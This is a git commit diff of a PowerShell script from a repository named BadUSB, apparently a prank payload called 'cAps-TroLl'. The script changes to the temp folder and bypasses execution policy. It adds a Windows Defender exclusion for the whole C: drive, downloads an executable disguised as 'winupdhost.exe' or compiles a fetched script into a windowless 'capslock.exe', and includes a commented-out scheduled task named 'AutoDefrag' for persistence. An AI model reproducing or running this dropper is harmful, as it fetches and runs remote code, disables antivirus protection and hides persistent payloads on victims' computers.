c640202d98bb69456758cdad3061bdfd614617b6
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 22:04:04 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -1,8 +1,8 @@
 cd $env:Temp;
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-Add-MpPreference -ExclusionPath C:/;
-iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O winupdhost.exe -UseBasicParsing;
+iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/raw.ps1 -O raw.ps1;
 Start-Sleep 1;
+Set-ExecutionPolicy -ExecutionPolicy Bypass;
+Import-Module ps2exe;
+ps2exe.ps1 raw.ps1 capslock.exe -noConsole;
 #schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
-#Remove-MpPreference -ExclusionPath C:/;
 exit
